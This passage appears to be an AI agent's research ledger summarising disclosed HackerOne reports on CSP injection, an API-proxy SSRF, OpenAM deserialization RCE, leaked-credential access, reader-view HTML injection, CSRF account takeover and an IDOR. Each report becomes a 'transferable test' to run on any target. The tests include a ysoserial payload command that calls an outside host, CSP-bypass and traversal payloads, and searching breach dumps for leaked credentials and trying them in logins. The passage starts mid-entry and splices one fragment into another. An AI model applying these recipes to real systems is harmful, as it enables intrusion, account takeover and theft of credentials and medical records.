CHAIN: attacker-influenced value flows into a dynamic CSP directive (precondition: the app sets CSP from untrusted user input) -> `; script-src * 'unsafe-inline'` (or `; default-src *`) appended into the emitted header (primitive: security-control injection) -> CSP neutralized -> ANY XSS the policy would have blocked (stored/reflected/DOM; incl. every "CSP mitigates it" downgraded finding and the recorded gadget defeats) EXECUTES in the victim origin -> session/credential theft -> ATO. Per doctrine the bypass is recorded ONLY as the chain's escalation link: alone it changes no data; its concrete terminal is the XSS -> session theft/ATO it un-blocks.
TRANSFERABLE TEST: on any app emitting dynamic CSP, feed `; script-src 'unsafe-inline'` and `aaa bbb` into every value that influences the policy (allowed origins, report-uri, per-user/domain settings), diff the emitted header for a new directive/source, then chain the landing injection with ANY CSP-blocked XSS on the same origin and demonstrate script execution. Rule: **a policy builder must reject the policy grammar's own delimiters (`;`, whitespace) in values — where it doesn't, the security control itself is the injection sink and every "CSP mitigates this XSS" downgrade is wrong.**
DEDUPE/DELTA: tokens `2905532`, `CVE-2024-54133`, `content_security_policy`, `InvalidDirectiveError`, `2440762`, `ryotak` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: the CSP-BYPASS-GADGET corpus (§1.2 GitLab comment XSS + CSP bypass; the googleapis JSONP `callback=setTimeout` bypass; the Kroki `data-diff-for-path` gadget; the git-lfs `script-src 'self'` defeat; the PayPal CSP-less-subpage route) — those DEFEAT a FIXED policy with gadgets; THIS injects INTO the policy itself because the builder accepts grammar delimiters in values. NEW: the CSP-directive-injection class + the "policy builder must reject its own grammar delimiters" rule -> §17.763.
FRESHNESS: created 2024-12-18, disclosed 2025-02-06 — OUTSIDE the preferred 6-12 month window (~21 months). Read because assigned; the instance is version-bounded (fixed actionpack 7.0.8.7/7.1.5.1/7.2.2.1/8.0.0.1) but the general rule is not.
HONESTY: not reproduced (knowledge intake only). The assigned H1 body is a stub (485 B); the METHOD comes from the CREDITED advisory + fix patch read IN FULL this pass (both quoted verbatim above), NOT invented report content.

ROUTE: live `curl https://hackerone.com/reports/674800.json` — HTTP 200 but `visibility: no-content`, `vulnerability_information` 0 B (researcher body withheld); the envelope's `summaries[]` (team summary + researcher summary) and `web_extract` on the live report page were read this pass. Metadata: Valve, "/applications/dpc_(get|post) provide full access to api.steampowered.com with the Dota2 API key", reporter `njbooher3`, created 2019-08-16, disclosed 2024-07-30, weakness SSRF, asset `www.dota2.com`, severity high (8.2 per timeline), bounty awarded, Resolved.
STATUS: UNVERIFIED (not reproduced; exact traversal parameter/request shape not public)
CLASS: SSRF / privilege escalation — path traversal inside a server-side API PROXY that attaches a server-held ELEVATED API key -> arbitrary method invocation on the third-party API at the key's privilege (admin/internal service access)
CORE METHOD:
  1. ENTRY POINT (title, verbatim): "`/applications/dpc_(get|post)` provide full access to api.steampowered.com with the Dota2 API key" — `www.dota2.com/applications/dpc_get` / `dpc_post` proxy the caller's request to `api.steampowered.com` and attach the SERVER's Dota2 API key.
  2. THE DEFECT (Valve team summary, verbatim): "Insufficient validation of parameters enabled using path traversal to call arbitrary API methods using an API key that had elevated privileges for Dota2." — the proxied method path is caller-influenced and unvalidated, so traversal escapes the intended fixed API route.
  3. THE GAIN (title, verbatim): "full access to api.steampowered.com with the Dota2 API key" — arbitrary Steam Web API methods callable under the server's ELEVATED key (a key with more privilege than any public caller, on an API the attacker holds no key for).
  4. LIMITS: the researcher body is withheld, so the exact traversal parameter and request shape are NOT public — do not assume one; the transferable test enumerates the standard shapes only.
DETECTION SIGNAL: any app endpoint shaped "our app forwards this to <third-party/internal API> and adds a key/signature server-side" (`/proxy`, `/api/forward`, `/applications/*_get|_post`, BFF/aggregator routes, integrations adding `key=`/`Authorization:`); tell: responses matching the VENDOR's API docs/error format for methods the app's own UI never exposes.
CHAIN: attacker calls the app's own proxy endpoint with a traversed/overridden method path (precondition: reach the proxy route — no vendor key or vendor auth needed) -> the proxy builds the vendor request with the server's elevated key (primitive: caller-influenced path under a server-held privileged credential) -> arbitrary vendor-API methods execute at the key's privilege (terminal per title/summary: "full access to api.steampowered.com with the Dota2 API key" — privileged data/actions of that API; high 8.2). Generalized terminal: service-key abuse = read/write actions reserved for the service itself (users, orders, inventory, billing) = privilege escalation to service level.
TRANSFERABLE TEST: enumerate every endpoint that forwards to a third-party or internal API with a server-side key; (1) replace the proxied path with a traversal — `../<other-method>`, `..%2f`, absolute `https://…`, `//host/…`, or an explicit `method=`/`path=`/`endpoint=` parameter; (2) call a method the app's UI never offers and compare with the vendor's public API docs (field shape, error format); (3) any response only the KEY's privilege could produce = the bug. Rule: **an API proxy that attaches a privileged server-held key must pin BOTH the target host AND the full method path — any caller-influenced path segment under a service key is privilege escalation on that API.**
DEDUPE/DELTA: tokens `674800`, `dpc_`, `dota2`/`Dota2` = 0 technique hits across the three write targets immediately before append. Pre-existing `steampowered`/`dota2` hits REVIEWED and NOT conflated: #383127 (`partner.steampowered.com/report_xml.php` blind SQLi via array param — different endpoint/class), batch-285's #292457 (`www.dota2.com` reflected XSS — different), #407971 (Valve support email-code brute force, redacted — different). Proxy/SSRF corpus reviewed: #2301565 (webhook URL test — unrestricted outbound URL), the ingress/controller config-template RCE family, the SSRF->169.254.169.254 IAM family, #1551586 (redirect credential leak) — none records the "fixed-base API proxy + server-held key + path traversal -> arbitrary method under the key" atom. NEW: the API-proxy key-abuse class + the pin-host-AND-path rule -> §17.764.
FRESHNESS: created 2019-08-16, disclosed 2024-07-30 — OUTSIDE the preferred 6-12 month window (disclosure ~15.5 months old; the finding itself 2019). Read because assigned; the class is not version-bound.
HONESTY: not reproduced; researcher body withheld by H1 (`visibility: no-content`, researcher summary "."). Every quoted phrase above is verbatim from the TITLE and Valve's team summary in the live `.json` envelope + live page read this pass; the request-shape enumeration is generic test guidance, NOT claimed as the report's.

SOURCE: https://hackerone.com/reports/1248052  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1248052.json` — HTTP 200, `visibility: full`, VI 1,391 B read IN FULL (repro sketch + response); the body credits the public writeup https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464 which was read IN FULL this pass (17,035 B via `web_extract`) and supplies the mechanics quoted below. Metadata: U.S. Dept Of Defense, "Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)", reporter `fdeleite`, created 2021-06-30, disclosed 2023-12-21, CVE-2021-35464, weakness insecure deserialization.
STATUS: UNVERIFIED (not reproduced)
CLASS: insecure Java deserialization -> pre-auth RCE (CWE-502) — the legacy Jato framework's PAGE-SESSION parameter (`jato.pageSession`) round-trips a serialized Java object through the client and deserializes it with `ObjectInputStream` before any auth check
CORE METHOD:
  1. ENTRY POINT (report, verbatim): `GET /openam/ccversion/Version?jato.pageSession=XYZ` with "Replace **XYZ** by the payload saved into the payload.txt file"; the credited writeup's minimal PoC is `GET /openam/oauth2/..;/ccversion/Version?jato.pageSession=<serialized_object>` — the Tomcat `..;/` path trick bypasses a reverse proxy that only allows URLs under `/openam/oauth2/` ("the well-known Apache Tomcat Path traversal trick (..;/) worked perfectly to bypass this restriction").
  2. THE SINK (writeup, verbatim, `com/iplanet/jato/view/ViewBeanBase.class`): `String pageAttributesParam = context.getRequest().getParameter("jato.pageSession"); if (pageAttributesParam != null && pageAttributesParam.trim().length() > 0) { try { this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false)); }` — "Internally, it performs native Java serialization using ObjectInputSteam, with a compression on top."
  3. THE ENCODING (report + writeup, verbatim): "a serialized Java object, prepended with a null byte and encoded with base64url" — `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Click1 "curl https://<collab-id>.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`.
  4. GADGET ROTATION (writeup): URLDNS first (DNS pingback = proof); CommonsBeanutils1 where commons-beanutils:1.9.4 sits in the classpath; on the bounty target only JRMPClient "worked" (response delay proving a firewalled outbound connect) until the author BUILT the Click1 chain for the deployed classpath (`java.util.PriorityQueue.readObject -> ... org.apache.click.control.Column$ColumnComparator.compare -> ... TemplatesImpl.getOutputProperties -> ... Runtime.exec`, now upstream ysoserial `Click1.java`; report uses `Bin4xin/sweet-ysoserial`). BLIND CONFIRMATION (writeup): `sleep 10` timing, then "I blindly executed this command and saved the result to the web folder" and GET it.
  5. LIMITS (writeup): "this vulnerability does not affect instances running with Java version 9 or newer, since Jato requires classes that have been removed in Java 9"; patched in ForgeRock AM 7.0 "by entirely removing the /ccversion endpoint, along with other legacy endpoints that use Jato"; warning: "all other products that rely on it may still be affected".
DETECTION SIGNAL: any OpenAM / ForgeRock AM host (or any product built on Sun ONE Application Framework / Jato) — parameter names `jato.pageSession` / `*.pageSession` in query strings or hidden fields, Jato footprint in decompiled JARs; proxy-restricted `/openam/oauth2/`-only exposure defeated by `..;/`; Oracle: the report's response is `HTTP/1.1 302 Found` with `Location: .../openam/base/AMInvalidURL` — a 302/404 is NOT a negative verdict, the gadget runs BEFORE the invalid-page redirect; discriminate with URLDNS pingback or JRMPClient delay.
CHAIN: unauthenticated GET to a Jato page (precondition: reach a Jato endpoint; `..;/` defeats a proxy prefix allowlist) -> `jato.pageSession` = base64url(NUL + serialized gadget) decoded and passed to `ObjectInputStream` (primitive: pre-auth deserialization) -> Click1 / CommonsBeanutils1 gadget reaches `Runtime.exec` (terminal: pre-auth RCE as the app-server account; report impact, verbatim: "An unauthenticated, 3rd-party attacker or adversary can execute remote code"). Per doctrine §8: precondition = network reach of a Jato endpoint, no auth, no user interaction; gain = code execution on the OpenAM host.
TRANSFERABLE TEST: on any Java host exposing a legacy-framework page-state parameter (fuzz `*.pageSession`, `pageState`, `__VIEWSTATE`-shaped hidden fields, `state`, `serialized`): (1) send a URLDNS object in the framework's own codec (Jato: `echo -ne \x00 && cat | base64 | tr '/+' '_-' | tr -d '='`) and watch for the DNS pingback; (2) rotate gadgets to the DEPLOYED classpath — CommonsBeanutils1, then JRMPClient as a delay oracle, then a custom chain found with gadgetinspector/serianalyzer against the product's OWN libs when stock chains die; (3) confirm blind with `sleep 10` timing and by writing command output to a web-reachable folder and GETting it. Rule: **a framework page-session parameter that round-trips serialized UI state through the client is a pre-auth `ObjectInputStream` — decode it with the framework's own encoding, and rotate the gadget to the deployed classpath, not to your lab's.**
DEDUPE/DELTA: tokens `1248052`, `35464`, `jato`, `pageSession`, `OpenAM`, `Click1`, `ccversion` = 0 technique hits across the three write targets immediately before append. Recorded Java-native-deserialization corpus REVIEWED and NOT conflated: JBoss `HTTPServerILServlet` raw-POST carrier (batch-166 #221294 — explicitly NO §17 slot under the batch-165 precedent "a new carrier for an owned class gets no slot"), PeopleSoft `/monitor` (§17.636), Liferay JSONWS c3p0 `HexAsciiSerializedMap` (§17.398), DNN `DNNPersonalization` cookie (§17.438, .NET), Jackson `@class` (§17.510), VMware JDBC in-URL blobs, and the ASP.NET `__VIEWSTATE` chains (the .NET sibling of "serialized UI state in a page parameter"). DELTA here: the Jato/Java page-session carrier + the NUL-prefix base64url codec + the `..;/` proxy-prefix bypass + gadget rotation to a custom chain when stock chains fail + "302 to AMInvalidURL happens AFTER execution" signal. Per the batch-165 precedent (new carrier of an owned class = no slot), NO §17 slot.

Read because assigned; the instance is version-bounded (Jato needs pre-Java-9 classes; AM 7.0 removed the endpoints) but the class recovers wherever a legacy framework round-trips serialized page state.

SOURCE: https://hackerone.com/reports/2053396  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/2053396.json` — HTTP 200, `visibility: full`, VI 2,383 B read IN FULL. Metadata: Mozilla, "Possibility of Deface through translation tool - www.mozilla.com", reporter `astrounder`, created 2023-07-06, disclosed 2023-10-27, no CVE.
STATUS: UNVERIFIED (not reproduced — no login attempted anywhere; knowledge intake only)
CLASS: sensitive info disclosure with PoC + admin/internal panel access — a third-party credential recovered from commercial BREACH-DUMP databases logs into the org's translation-management SaaS (Smartling), which holds write privilege over the production website's content (defacement-grade) plus internal documents
CORE METHOD:
  1. THE FIND (report, verbatim): "I found a credential of a third-party associated with Mozilla leaked on the internet. This credential gives access to https://dashboard.smartling.com/." — "Although the application is an external tool, this application is responsible for managing all translations of the Mozilla website and other *.Mozilla.com applications."
  2. THE CHANNEL (report, verbatim): "These leaks can be found on sites like https://cyberintelligence.house, https://dehashed.com/, and https://intelx.io/." — commercial leak/breach-dump search against corporate identities, NOT public repos.
  3. THE ACCESS (report): login with the dumped email/password (redacted at disclosure: "email: ████████ / password: ████"); the account holds Mozilla projects, verbatim: "API Tests, App Store Content, Blog Posts, Emails, Files, In-app messages (push notifications, etc.), Mozilla.org Site, SL Test Project, SUMO Articles, Surveys" — translation jobs, editing, and "internal Mozilla documents" (PoC screenshots show Jobs / Issues / Translating jobs / Editing / Files).
  4. THE IMPACT (report, verbatim): "A malicious agent with access to this application can change translations of www.mozilla.com, create translation jobs, gain access to internal Mozilla documents, and other related access." — the report's own framing is "Possibility of Deface through translation tool".
DETECTION SIGNAL: enumerate the third-party SaaS behind the target's CONTENT PIPELINE (translation/localization: Smartling, Transifex, Phrase, Crowdin; CMS; email-template tooling) from page source, response headers (`X-Smartling-*`), injected translation-proxy scripts, DNS CNAMEs, webhook/callback hosts, or employee mentions; then probe leak databases/paste sites for corporate addresses paired with those vendor domains. TELL: a successful login to a vendor dashboard listing the target's LIVE content projects.
CHAIN: leaked corporate credential (primitive: breach-dump search on dehashed/intelx/cyberintelligence.house; the working credential is the PoC) -> login to the translation-management SaaS (escalation: admin-equivalent panel over the org's whole content estate) -> "change translations of www.mozilla.com, create translation jobs, gain access to internal Mozilla documents" (terminal: production-site defacement/integrity control + internal document disclosure — doctrine §1 admin/internal panel access and sensitive-info-disclosure-with-PoC).
TRANSFERABLE TEST: for every target, list the third-party services behind its content/email/app pipeline (source comments, DNS/CNAMEs, CSP, JS includes, webhook callbacks), search commercial leak databases and paste sites for corporate addresses paired with those vendor domains, VALIDATE each candidate with ONE benign login (change nothing), and record what the account can write (site content, campaigns, docs). Rule: **a content-pipeline SaaS account (translation, CMS, email tooling) is an admin-equivalent surface on the web estate — a leaked credential there writes the production site and holds internal documents; leak databases are an intake channel even when GitHub is clean.**
DEDUPE/DELTA: tokens `2053396`, `smartling`, `dehashed`, `intelx`, `cyberintelligence`, `astrounder` = 0 hits across the three write targets immediately before append. Recorded neighbours REVIEWED and NOT conflated: §9.5 (GitHub dorking) + the #761791 chain (Dropbox/HelloSign employee-repo -> TestRail `API_KEY` -> third-party-SaaS read/write — appended WITHOUT a §17 slot because the CHANNEL was already owned), #360811 (Starbucks GitHub SAP creds — declined: channel recorded + access unverified), #440629 (Starbucks China Android hardcoded cloud credential — declined: hardcoded-secrets-in-builds family recorded), ledger 16096 (password string on a page -> replay -> single-account access). DELTA here: the intake channel is COMMERCIAL BREACH-DUMP SEARCH (unrecorded) and the terminal is the content-pipeline class mapping (translation SaaS = production-content write + internal docs). Per the #761791 precedent (credential-replay carriers get a ledger entry for their chain, no §17 slot), NO §17 slot.
FRESHNESS: created 2023-07-06, disclosed 2023-10-27 — OUTSIDE the preferred window (~3 years). Read because assigned; channel and terminal are version-independent.

SOURCE: https://hackerone.com/reports/991713  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/991713.json` — HTTP 200, `visibility: full`, VI 1,588 B read IN FULL. Metadata: Brave Software, "HTML injection in title of reader view", reporter `nishimunea`, created 2020-09-25, disclosed 2023-06-22, asset `brave-ios` source code.
STATUS: UNVERIFIED (not reproduced)
CLASS: HTML/XSS injection with real impact via TEMPLATE PLACEHOLDER RE-ENTRY — the reader-view template substitutes `%READER-TITLE%` from the page `<title>` unescaped, and the injected markup can invoke the template's OTHER placeholder (`%READER-CONTENT%`) to capture the original page's content (script-less exfiltration) or render a phishing form instead of the document
CORE METHOD:
  1. THE SINK (report, verbatim): "Reader.html in Brave doesn't escape/trim HTML tags in %READER-TITLE%." (`https://github.com/brave/brave-ios/blob/development/Client/Frontend/Reader/Reader.html#L17`) — "This allows any page to inject malicious HTML code in reader-mode page through `<title>{html code you want to inject}</title>`." The readerized page is "hosted in localhost:65XX" (privileged local origin).
  2. THE PHISH (report): serve a document whose `<title>` carries a fake login form; open reader mode — "Malicious login form is rendered instead of the document"; "Fill the form, then the user/password you filled are stolen to malicious website".
  3. THE RE-ENTRY (report, verbatim): "Also, if injected HTML code contains a string `%READER-CONTENT%`, it is replaced to the original page contents." (`ReaderModeUtils.swift#L29`) — injected `<form><textarea>%READER-CONTENT%</textarea><input type="submit"></form>` comes back with the REAL page content inside the textarea; the report's Google-search repro URL: `https://www.google.com/search?q=%3Cform%3E%3Ctextarea%20name%3D%22dom%22%3E%25READER-CONTENT%25%3C%2Ftextarea%3E%3Cinput%20type%3D%22submit%22%3E%3C%2Fform%3E`.
  4. THE GAIN (report, verbatim): "attacker can steal user's sensitive information contained in the original HTML page" — content exfiltration WITHOUT script execution (form submit to the attacker), plus the phishing arm's credential theft. PoC vectors: a Google Docs document + the reader-mode button, or the Google search link above.
DETECTION SIGNAL: any client-side template with MULTIPLE `%...%`/`{{...}}`/`__...__` placeholders substituted in ONE pass where a page-controlled value (title/author/byline/credits) is substituted unescaped; oracle: put the OTHER placeholder's literal name inside your injected HTML and check whether it comes back FILLED with the legitimate content. Reader/print/AMP/proxy modes re-rendering third-party pages in a privileged local origin (`localhost:65XX`) are the high-value surface.
CHAIN: attacker serves a page whose `<title>` carries HTML (primitive: `%READER-TITLE%` substituted unescaped) -> victim activates reader mode on it (precondition: UI:R) -> arm 1: fake login form renders IN the privileged reader origin instead of the document -> "the user/password you filled are stolen" (terminal 1: credential theft -> ATO of whatever the victim types); arm 2: injected `%READER-CONTENT%` receives the ORIGINAL page's content -> one form submit exfiltrates the sensitive content of pages the victim was reading (terminal 2: cross-origin content theft). Per doctrine §8: precondition = victim opens the attacker's page and activates reader mode; gain = victim credentials + victim page content from a privileged local origin.
TRANSFERABLE TEST: on any template-based renderer (reader/print/AMP/email/PDF/theme engines), enumerate its placeholder tokens (read the template in the app source or diff rendered output); inject HTML through every unescaped page-metadata sink and include the OTHER placeholders verbatim in your markup (`<form><textarea>%CONTENT%</textarea></form>`, `{{body}}`, `__EMAIL_CONTENT__`); if the rendered output shows the legitimate content inside YOUR wrapper, submit it to your listener — content capture with no script execution needed. Rule: **in a multi-placeholder substitution pass, injected markup can invoke the remaining placeholders — the template hands you the legitimate content wrapped in your own form; script-less exfil beats hunting for an XSS context.**
DEDUPE/DELTA: tokens `991713`, `READER-CONTENT`, bare `READER-TITLE`, `nishimunea` first report = 0 technique hits for the re-entry atom across the three write targets immediately before append. Recorded neighbour REVIEWED and NOT conflated: §17.354 (#1436142 — SAME product, SAME reporter, later bug: `%READER-CREDITS%` substituted from `<meta name="author">` unescaped + `%READER-TITLE-NONCE%` CSP-nonce placeholder fill). §17.354 owns the unescaped-metadata-substitution SINK and the NONCE-fill escalation; this entry is the EARLIER report (#991713) and contributes a DIFFERENT exploitation mechanism: PLACEHOLDER RE-ENTRY — the injected markup calls the template's content placeholder and captures the legitimate substituted content (script-less exfil + form phishing). New general method -> §17.765.
FRESHNESS: created 2020-09-25, disclosed 2023-06-22 — OUTSIDE the preferred window (disclosure ~2.4 years). Read because assigned (Brave iOS 1.20 era); the placeholder-re-entry mechanism is version-independent.
HONESTY: not reproduced (knowledge intake only; nothing sent to Brave or any target). Every quote above is verbatim from the live `.json` body read IN FULL this pass.

Two flaws are named but only the FIRST is demonstrated in the body: (a) no cancel/withdraw-invite affordance (a missing feature) -> an invited-but-withdrawn/mistyped address can still join; (b) the title's "resent as a Reminder after invalidating" (a reminder job re-arms a revoked invite) is asserted in the title but NOT shown in the repro. Doctrine bar: severity LOW, terminal is single-workspace info disclosure (no monetary/account-takeover/RCE leg), and the repro is a missing-button observation. The revocation-ineffectiveness family is ALREADY RECORDED at ledger 10075/10077 ("a role/promotion/invite OFFER or ACCEPT token ... not invalidated when the underlying state is reverted (demote, revoke, cancel, expire ...); re-send the identical accept request — if the state re-applies, the token was never bound to the state") and the invite-bearer family at ledger 11146/11148 (unbound invite-accept link = bearer credential). Residue for the record only: the REMINDER/RE-NOTIFICATION job that re-sends an explicitly-invalidated invite is a revocation-undo carrier of that family — test "invalidate/cancel the pending invite, then trigger resend/reminder and re-accept." SOURCE: https://hackerone.com/reports/1066189  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1066189.json` — HTTP 404 (hard 404, `user-authenticated: false`; a control fetch of #978823 returned HTTP 200 the same minute, so this is per-report withdrawal, not rate limiting); live page via `web_extract` and via the browser tool = the HackerOne sign-in wall (`/users/sign_in`, Cloudflare "Just a moment..."); `https://r.jina.ai/<url>` = HTTP 403 "Upstream forbidden"; Wayback raw `id_` captures (20210520135824 / 20210922150936 / 20220704001411 / 20221004160755 / 20231208160800) = the JS shell only, og:description "zzzzzzaa" in the 2023 capture and absent in the earlier ones. BODY RECOVERED IN FULL (793 B `vulnerability_information`) from the HuggingFace disclosed-reports parquet mirror `elamaran619/hackerone_disclosed_reports` (all three splits downloaded and queried locally with pyarrow; the row's id/title/created_at/disclosed_at/weakness/team match the report). Metadata: QIWI, "Account takeover just through csrf in https://booking.qiwi.kz/profile", reporter `ahmed_alwardani` (per the mirror row — the bugbountyhunter.com aggregator lists `sniper302`; discrepancy noted, not resolved), created 2020-12-25, disclosed 2021-05-20, weakness Improper Access Control - Generic, severity medium.
STATUS: UNVERIFIED (not reproduced)
CLASS: broken access control / business-logic ATO chain — a "confirm contact" endpoint takes the VALUE-TO-VERIFY as a request parameter and performs the WRITE (set the contact + accept it as confirmed) with NO verification token and NO CSRF protection, over GET (CWE-352 + CWE-287 -> CWE-640)
CORE METHOD:
  1. ENTRY POINT (report, verbatim): `https://booking.qiwi.kz/ajax__confirm_contact?type=email_confirmed&contact=email@email.com&iframePopupMode=1` — "after register by any account, we can found that we can change email in profile to another one, by just using a GET request ... but without verification, attacker can steal account without verification."
  2. THE WRITE (report PoC, verbatim): "1 - after register open https://booking.qiwi.kz/profile  2 - now just use this url https://booking.qiwi.kz/ajax__confirm_contact?type=email_confirmed&contact=alwardaniahmed2@gmail.com&iframePopupMode=1" — the account's contact email is REPLACED by the attacker-supplied `contact` value and accepted as confirmed (`type=email_confirmed`), with no token binding the confirmation to any earlier enrollment. The endpoint is nominally a CONFIRMATION step; the value-to-confirm rides in the request, so the confirmation IS the write.
  3. THE TERMINAL (report, verbatim): "3 - now i can take your account by go to reset password and reset your password by using victim email , and i will recieve the reset password token in my email" — the account's password-reset token is mailed to the attacker's address now sitting on the account.
  4. THE DELIVERY: the call is a plain GET, the value is in the query string and there is no anti-CSRF token — the title's "just through csrf" arm is one link/`<img>`/top-level navigation in the victim's logged-in session (Lax cookies ride on top-level GET).
DETECTION SIGNAL: any account-settings surface offering contact/e-mail "confirmation"/"verification" — capture the XHR behind it (`/ajax__*`, `*confirm*`, `*verify*`); the tell is a request whose params carry BOTH the action type AND the value (`type=email_confirmed&contact=<value>`, `verified=1&email=<value>`, `code=<value>`), with no opaque token/nonce bound to a pending enrollment; also test whether the verb is GET (fireable cross-site).
CHAIN: victim logged in to the booking/profile app (precondition: one victim GET while authenticated) -> the token-less confirm-contact call sets the attacker's email as the account's confirmed contact (primitive: unverified write, CSRF-able GET) -> attacker requests a password reset for that account (escalation: the reset token is a bearer credential delivered by e-mail) -> the token arrives at the attacker's mailbox, now the account's contact -> attacker sets the password = account takeover (terminal; report, verbatim: "attacker can takeover victim account"). Per doctrine §8: precondition = one victim click/GET; gain = full account takeover.
TRANSFERABLE TEST: enumerate every contact/e-mail/phone confirm-verify endpoint (`/ajax__confirm*`, `*verify*`, `*confirm*`, params `type=email_confirmed|verified=1|code=`): (1) call it directly with an attacker-controlled value in the VALUE parameter and NO token — if the account state changes (e-mail replaced and flagged verified), it is an unverified WRITE; (2) check GET-ability — fire it cross-site from `<img>`/link and confirm the write lands in the victim session; (3) close the loop with the password-reset flow — request the reset for the account and see whether the token arrives at the attacker's address now bound to it. Rule: **a confirm/verify endpoint that takes the value-to-verify as a request parameter and carries no token binding the confirmation to a prior enrollment is not a verification step — it is an unverified write; call it directly or CSRF it, then claim the account with the password-reset token it now receives.**
DEDUPE/DELTA: tokens `1066189`, `booking.qiwi`, `ajax__confirm_contact`, `type=email_confirmed`, `iframePopupMode` = 0 technique hits across the three write targets immediately before append (the `email_confirmed` substring hits only `is_email_confirmed` in batch-140 notes). Related-but-distinct REVIEWED and NOT conflated: §12.1 (XSS -> email change -> ATO, XSS as the first link) and the XSS end-game entry (~15731, "POST the account-settings email change with NO CSRF token"); ledger ~3048-3056 (a purchase flow that WRITES an attacker-chosen email onto a victim account -> reset -> ATO); the Reddit "bypass email verification and change email to any other user email" entry (~3642, mechanism never published); #1551176 (mass-assigned e-mail implicitly marked verified — entry, deliberately NO §17 slot); §17.604 (Khan Academy — the verification token binds to the PENDING state, not the delivery address); §17.326 (a confirmation TOKEN leaked in a UI resend link plus a GET confirm endpoint); the GET-based-CSRF checklist (V-02). DELTA here: the confirm endpoint is ITSELF the write path — the value rides in the request (`contact=`), there is NO token at all (neither a leaked token nor a rebindable token), and the whole chain is one CSRF-able GET -> password-reset ATO. Per the batch-165 / #1551176 / #1851818 precedent (a new carrier/mechanism-variant of an owned class gets a ledger entry and NO §17 slot), NO §17 slot.
FRESHNESS: created 2020-12-25, disclosed 2021-05-20 — OUTSIDE the preferred 6-12 month window (~5.4 years). Read because assigned; the "confirm endpoint = unverified write" mechanism is version-independent.
HONESTY: not reproduced (knowledge intake only; booking.qiwi.kz was NOT touched). The body is quoted verbatim from the HuggingFace mirror row read this pass (every live HackerOne route is 404/walled for this report); the report demonstrates the unverified write on the researcher's own account and states the CSRF arm only in the TITLE — the cross-site delivery is inferred from the GET shape plus the title and is labelled as such, not claimed as demonstrated body content.

SOURCE: https://hackerone.com/reports/1085782  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/1085782.json` — HTTP 200, `visibility: full`, VI 2,446 B read IN FULL. Metadata: U.S. Dept Of Defense, "█████████ IDOR leads to disclosure of PHI/PII", reporter `nidens`, created 2021-01-24, disclosed 2021-02-18, severity critical, weakness Insecure Direct Object Reference (IDOR). Endpoint/param names redacted at source (`████`).
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no DoD system touched)
CLASS: authorization bypass / IDOR (BAC) with sensitive-data terminal (PHI/PII) — the access-control DENIAL is implemented as a 302 redirect issued AFTER the document was generated, and the unauthorized document rides in the body of the 302
CORE METHOD:
  1. SURFACE (report, verbatim): "there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form. After viewing my ██████████'s shot records, I noticed this functionality lives on the following endpoint `https://████=[id]`" — a PDF medical-record export behind CAC authentication ("this vulnerability does require CAC authentication"), where the caller legitimately owns ONE record.
  2. THE "DENIAL" (report, verbatim): "If you increment or decrement the `██████` parameter by 1 the application will throw an HTTP Status Code 302 and redirect you back to the `██████████` endpoint which is a good security practice."
  3. THE LEAK (report, verbatim): "The issue with this is, that with the 302 redirect the PDF of the incremented ID will be attached in the body of the 302 requests, you are able to extract this when using a proxy like Burp Suite." — the cross-user record is rendered into the REDIRECT response; the status code says "denied" while the body carries the resource.
  4. THE EXTRACT (report, verbatim): "On the 302 redirects, you can utilize the function `Copy to File` in burp suite to save this request as a pdf and you will have a PDF version of my ██████ shot record." — repro: login with CAC -> browse the export endpoint -> vary the ID ±1 -> save the 302's body as PDF.
  5. THE FIX (report, verbatim): "Enforce the same permissions that are used for the `██████████` and `████` functions of the application." — the check must run BEFORE the document is generated.
DETECTION SIGNAL: an ID-parameterized document/record export (PDF/CSV/print) where cross-ID requests do NOT return 200 but 302/403/404 to a "safe" page — the tell is a non-2xx response whose BODY is non-HTML (a PDF/document) or matches the size/type of the legitimate export. Oracle: diff the body of the 302 against the body of a legitimate 200 export.
CHAIN: any authenticated user with legitimate access to ONE record (report: an ordinary sponsor, a "non-medical user"; precondition = routine login, no user interaction) -> vary the ID on the PDF export (primitive: cross-object read) -> the deny-redirect still ATTACHES the PDF of the incremented ID (escalation: the denial path is a second read surface) -> "pull any shot record without being associated with medical" — cross-user PHI/PII (immunization records) at scale, one record per ±1 (terminal per report: "PHI/PII disclosure", severity critical). Per doctrine §8: precondition = authenticated ordinary user holding one legitimate record; gain = any user's medical records = P1/P2 cross-tenant sensitive data read.
TRANSFERABLE TEST: on every ID-parameterized export/download/print endpoint: capture one LEGITIMATE export in a proxy; then vary the ID (±1, other users' ids) and SAVE THE FULL RESPONSE BODY OF EVERY STATUS — 302/403/404 included (Burp: right-click -> "Copy to file"/"Save response"; `curl -o out.bin -D headers.txt`). If the body of the "denied" response is the document (or any part of it), the authorization check runs after generation and the IDOR is live. Rule: **a redirect is not a denial if the resource rides in the response body — always read 3xx/4xx bodies on ID-varying document exports; the deny path is a read surface.**
